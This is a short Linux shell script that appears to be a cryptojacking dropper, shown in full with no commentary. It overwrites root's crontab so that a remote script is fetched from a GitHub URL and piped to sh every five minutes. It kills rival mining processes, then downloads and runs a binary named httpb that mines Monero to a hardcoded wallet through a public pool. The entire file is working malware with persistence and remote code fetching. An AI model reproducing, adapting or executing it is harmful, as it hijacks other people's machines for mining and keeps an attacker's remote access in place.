export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin

echo "*/5 * * * * wget -N -fsSL https://github.com/idg7494/idg7494/raw/master/lsqj.sh | sh" > /var/spool/cron/root
mkdir -p /var/spool/cron/crontabs
echo "*/5 * * * * wget -N -fsSL https://github.com/idg7494/idg7494/raw/master/lsqj.sh | sh" > /var/spool/cron/crontabs/root



ps auxf|grep -v grep|grep /tmp/duckduckgo|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "/usr/bin/cron"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "/opt/cron"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "/usr/sbin/ntp"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "/opt/minerd"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "yam"|awk '{print $2}'|xargs kill -9

Dohttpb()
{
if [ ! -f "/tmp/httpb" ]; then
wget -P /tmp https://github.com/idg7494/idg7494/raw/master/httpb
fi
chmod +x /tmp/httpb
nohup /tmp/httpb -c x -M stratum+tcp://437j1SzjJp56GJY424YSvX6acUafYdfjvLr4hex9wQraYAznJ4VQnPsLV4qCvvhEmFWeqAP347yuZhuhoawANZtm6b29keq:x@xmr.crypto-pool.fr:3333/xmr > /dev/null 2>&1 &
}

ps auxf|grep -v grep|grep "httpb" || Dohttpb
